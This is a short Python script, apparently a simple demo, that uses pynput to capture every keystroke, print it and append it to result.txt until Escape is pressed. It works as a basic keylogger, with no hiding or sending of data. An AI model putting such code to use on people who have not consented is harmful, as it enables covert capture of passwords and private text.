from pynput.keyboard import Listener
from pynput.keyboard import Key
import re

def press(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'','',tecla)
    with open("result.txt","a") as arq:
        arq.write( tecla + "\n")
        arq.close
    print(tecla)

def sair(tecla):
    if (tecla == Key.esc):
        print("ESC is pressed")
        #stop listener
        return False


with Listener (on_press= press, on_release= sair) as l:
    l.join()
   
